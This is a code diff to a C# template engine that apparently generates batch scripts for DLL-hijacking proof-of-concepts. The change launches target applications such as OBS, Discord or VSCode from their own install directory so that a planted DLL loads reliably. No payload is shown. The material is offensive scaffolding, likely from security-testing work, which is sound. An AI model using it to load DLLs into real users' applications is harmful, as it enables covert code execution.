@@ -934,7 +934,13 @@ public static class TemplateEngine
             sb.Append("    echo [!] Host EXE not found: \"%HOST_EXE%\"\r\n");
             sb.Append("    del \"%DEPLOY_PATH%\" >nul 2>&1\r\n");
             sb.Append("    exit /b 3\r\n");
-            sb.Append(")\r\n\r\n");
+            sb.Append(")\r\n");
+            // Derive host's own directory so we can launch with CWD = install dir.
+            // Many hosts (OBS, Discord, VSCode, Jetbrains tools) resolve assets
+            // (locale .ini, themes, plugins) relative to CWD before falling back
+            // to GetModuleFileName. Inheriting the .bat's CWD (output\<poc>\) makes
+            // those lookups fail and the host aborts before our DLL is ever touched.
+            sb.Append("for %%I in (\"%HOST_EXE%\") do set \"HOST_DIR=%%~dpI\"\r\n\r\n");
 
             sb.Append("echo === RUN ===\r\n");
             if (config.PreLaunchDelaySec > 0)
@@ -946,7 +952,7 @@ public static class TemplateEngine
             if (config.WaitForHostExit)
             {
                 sb.Append("echo [i] Close the host window when done -- script will then restore.\r\n");
-                sb.Append("start /WAIT \"\" \"%HOST_EXE%\"\r\n\r\n");
+                sb.Append("start \"\" /D \"%HOST_DIR%\" /WAIT \"%HOST_EXE%\"\r\n\r\n");
                 // Trampoline launchers (Battle.net, Teams, many updaters) spawn a child and
                 // exit instantly, which makes start /WAIT return before the child actually
                 // loads our DLL. Pause here so the user controls when RESTORE fires.
@@ -961,7 +967,7 @@ public static class TemplateEngine
                 // Fire-and-forget: start the host non-blocking, wait N seconds,
                 // then dump proof file (if written by payload) and proceed to cleanup.
                 sb.Append($"echo [i] Fire-and-forget mode -- will wait {config.NonBlockingTimeoutSec}s then inspect proof file.\r\n");
-                sb.Append("start \"\" \"%HOST_EXE%\"\r\n");
+                sb.Append("start \"\" /D \"%HOST_DIR%\" \"%HOST_EXE%\"\r\n");
                 sb.Append($"timeout /t {config.NonBlockingTimeoutSec} /nobreak >nul\r\n");
                 sb.Append("echo.\r\n");
                 sb.Append("echo === PROOF ===\r\n");
